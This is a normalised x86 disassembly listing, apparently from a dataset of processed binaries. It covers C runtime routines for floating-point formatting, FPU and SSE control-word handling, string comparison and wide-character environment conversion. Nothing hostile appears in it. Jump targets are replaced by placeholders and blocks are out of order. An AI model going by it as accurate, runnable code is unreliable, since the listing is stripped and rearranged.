xor ecx edx
and edx ebx
and esi ebx
and ecx 0x8000
cmp dx bx
lea edi [ esi + edx ]
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
movzx edi di
jae r-xdata
cmp ebx eax
je r-xdata
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x68 ] ecx
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
push 0x15
pop ecx
cmp [ ebp + 0x14 ] ecx
jle r-xdata
movsx ecx cx
add [ ebp + 0x14 ] ecx
cmp [ ebp + 0x14 ] eax
jg r-xdata
neg cx
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
cmp si bx
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_415600
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
push 0x8
sub esi 0x3ffe
mov [ ebp - 0x16 ] ax
pop ebx
mov [ ebp + 0x14 ] ecx
and [ edx ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
cmp di 0xbffd
ja r-xdata
test ebx ebx
jne r-xdata
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
cmp [ ecx ] 0x8000
mov [ ebp - 0x64 ] ecx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
mov eax [ ebp - 0x20 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add edi edi
or edi eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp di 0x3fbf
ja r-xdata
xor eax eax
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x16 ]
xor eax eax
mov ecx edi
mov esi 0x7fff
xor ecx edx
and edx esi
and edi esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
and ecx 0x8000
cmp dx si
lea eax [ edi + edx ]
movzx eax ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x64 ] eax
mov ecx eax
push r--data
push r--data
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc eax
test eax eax
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
cmp dx ax
jne r-xdata
mov [ ebp - 0x18 ] eax
jmp r-xdata
neg cx
sbb ecx ecx
and [ ebp - 0x1c ] 0x0
and ecx 0x80000000
add ecx 0x7fff8000
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x18 ] ecx
cmp di si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_411f2e
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_415600
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
test esi esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] eax
jg r-xdata
cmp si ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
cmp ax 0xbffd
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ax 0x3fbf
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
cmp ebx [ ebp - 0x40 ]
mov eax [ ebp - 0x60 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
cmp edx esi
mov [ ebp - 0x44 ] edx
jb r-xdata
inc eax
inc eax
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea esi [ ebp - 0x28 ]
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x48 ] edx
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
cmp ebx ecx
mov eax [ ebp - 0x60 ]
jae r-xdata
inc ecx
test edx edx
mov esi eax
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov edx [ ebp - 0x54 ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add edi 0xc002
xor eax eax
cmp di ax
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx edx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp di si
jne r-xdata
inc eax
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
and [ eax ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add edi 0xffff
cmp di ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x48 ] 0x2
sub [ ebp - 0x5c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ eax ]
cmp [ ebp - 0x44 ] 0x0
mov [ eax - 0x4 ] ebx
je r-xdata
lea edi [ ebp - 0xc ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] 0x5
mov edx [ ebp - 0x64 ]
inc eax
test [ edx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
cmp di ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add ebx ebx
or ebx edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add edi 0xffff
cmp di ax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x48 ]
movzx esi [ esi ]
movzx edx [ edx ]
and [ ebp - 0x44 ] 0x0
imul edx esi
mov esi [ eax - 0x4 ]
lea ebx [ esi + edx ]
cmp ebx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x5c ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
mov [ ebp - 0x44 ] edi
jg r-xdata
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x64 ]
add edx 0x8
mov [ ebp - 0x54 ] edx
cmp [ edx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr ebx 0x1
or ebx edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x58 ]
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add eax 0xc002
test ax ax
jle r-xdata
mov [ ebp - 0x70 ] 0x1
cmp esi edx
jae r-xdata
cmp [ edx ] esi
jne r-xdata
mov [ ebp - 0x16 ] si
jmp r-xdata
inc [ ebp - 0xe ]
cmp [ ebp - 0xa ] 0xffffffff
mov [ ebp - 0xe ] eax
jne r-xdata
cmp di 0x7fff
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
xor eax eax
cmp [ ebp - 0x58 ] eax
je r-xdata
add eax 0xffff
test ax ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x58 ] 0x2
sub [ ebp - 0x54 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x70 ] 0x0
mov edi [ ebp - 0x44 ]
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov ax [ ebp - 0xe ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
or edi ecx
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
neg cx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
cmp [ ebp - 0x6 ] 0xffff
mov [ ebp - 0xa ] eax
jne r-xdata
or [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov edx eax
neg edx
movzx edx dx
mov [ ebp - 0x44 ] edx
add eax edx
test ax ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add edi edi
or edi edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add eax 0xffff
test ax ax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x58 ]
mov esi [ ebp - 0x54 ]
movzx esi [ esi ]
movzx edx [ edx ]
mov edi [ edi - 0x4 ]
imul edx esi
and [ ebp - 0x70 ] 0x0
lea esi [ edi + edx ]
cmp esi edi
jb r-xdata
xor eax eax
jmp r-xdata
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc edi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr edi 0x1
or edi edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec [ ebp - 0x44 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
mov dx [ ebp - 0xe ]
mov [ ebp - 0x20 ] dx
mov edx [ ebp - 0xc ]
mov [ ebp - 0x1e ] edx
mov edx [ ebp - 0x8 ]
or eax ecx
mov [ ebp - 0x1a ] edx
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
cmp [ ebp - 0x6 ] 0xffff
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc eax
jmp r-xdata
sub_41fda7
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
test ebx 0x40000
pop esi
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_41fe35
xor eax eax
test dl 0x10
je r-xdata
test dl 0x8
push ebx
push esi
push edi
mov ebx 0x200
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
test edx 0x80000
mov edi 0x100
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
cmp edx 0x1000000
pop esi
pop ebx
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_41fed5
sub esp 0x10
push ebx
push ebp
push esi
push edi
fwait
fnstcw [ esp + 0x14 ]
mov ebx [ esp + 0x14 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov edi 0xc00
and eax edi
mov ebp 0x300
mov esi 0x200
je r-xdata
or edx 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx esi
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov eax esi
not eax
and eax edx
and ecx esi
or eax ecx
cmp eax edx
mov [ esp + 0x1c ] eax
je r-xdata
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx esi
jmp r-xdata
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx eax
call sub_41fda7
movzx eax ax
mov [ esp + 0x10 ] eax
fldcw [ esp + 0x10 ]
fwait
fnstcw [ esp + 0x10 ]
mov ebx [ esp + 0x10 ]
xor edx edx
test bl 0x1
je r-xdata
or edx ebp
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
and esi 0x308031f
mov edi esi
stmxcsr [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
xor esi esi
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test ax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test ax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test ax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test ax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test ax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax edi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebp 0x6000
and ecx ebp
je r-xdata
or esi 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax edx
mov [ esp + 0x1c ] edx
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax edi
jne r-xdata
call sub_41fe35
push eax
mov [ esp + 0x2c ] eax
call sub_41dadf
pop ecx
stmxcsr [ esp + 0x28 ]
mov eax [ esp + 0x28 ]
xor edx edx
test al al
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebp
jne r-xdata
or edx ebp
jmp r-xdata
mov edi 0x200
test edi eax
je r-xdata
push 0x10
pop edx
mov ecx [ esp + 0x1c ]
mov edx eax
xor edx ecx
or eax ecx
test edx 0x8031f
je r-xdata
mov edx edi
and edi [ esp + 0x24 ]
not edx
and edx esi
or edx edi
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ax 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ax 0x800
je r-xdata
or edx 0x4
test ax 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi eax
je r-xdata
or edx 0x1
mov ecx eax
and ecx ebp
je r-xdata
or edx 0x80000
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x2000000
sub eax 0x7fc0
je r-xdata
or edx esi
cmp ecx 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or edx edi
jmp r-xdata
cmp ecx ebp
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_4201d8
push ebp
mov ebp esp
mov eax [ ebp + 0xe ]
mov ecx 0x7ff0
mov edx eax
and edx ecx
cmp dx cx
jne r-xdata
and eax 0x8000
test dx dx
mov ecx eax
jne r-xdata
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_41d941
dec eax
pop ecx
pop ecx
je r-xdata
fldz
fcomp [ ebp + 0x8 ]
fnstsw ax
test ah 0x44
mov eax ecx
jpe r-xdata
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax 0x200
pop ebp
retn
dec eax
je r-xdata
neg eax
sbb eax eax
and eax 0xffffff08
add eax 0x100
pop ebp
retn
neg eax
sbb eax eax
and eax 0xffffffe0
add eax 0x40
pop ebp
retn
neg eax
sbb eax eax
and eax 0xffffff90
add eax 0x80
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x4
dec eax
je r-xdata
push 0x2
jmp r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
sub_42026c
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_419347
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_419347
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_4206c0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_42035c
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_410556
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_420aaa
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420aea
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_42045f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor esi esi
push edi
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
cmp eax esi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
call sub_413797
cmp eax esi
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
push esi
push [ ebp - 0x8 ]
push eax
push 0xffffffff
push [ edi ]
push esi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40fdab
pop ecx
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
call sub_420c8c
test eax eax
pop ecx
pop ecx
jge r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] esi
je r-xdata
push esi
push esi
push esi
push esi
push 0xffffffff
push eax
push esi
push esi
call ebx
cmp eax esi
mov [ ebp - 0x8 ] eax
je r-xdata
push [ ebp - 0x4 ]
call sub_40fdab
pop ecx
mov [ ebp - 0x4 ] esi
sub_4204f4
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
cmp edi esi
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
test ebx ecx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
